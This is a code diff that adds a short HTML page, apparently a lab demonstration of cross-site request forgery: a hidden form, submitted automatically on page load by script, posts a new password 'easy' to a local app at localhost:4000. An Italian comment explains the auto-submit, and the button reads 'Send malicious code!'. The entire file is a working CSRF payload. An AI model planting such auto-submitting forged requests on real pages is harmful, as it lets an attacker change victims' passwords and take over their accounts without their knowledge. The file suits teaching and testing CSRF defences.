@@ -1,0 +1,12 @@
+<html></html>
+<body>
+<form action="http://localhost:4000/csrf/app.php" method="POST">
+    <input type="hidden" name="password" value="easy">
+    <input type="submit" value="Send malicious code!">
+</form>
+
+<script>
+    document.forms[0].submit(); // Il form viene inviato automaticamente all'apertura della pagina
+</script>
+</body>
+</html>
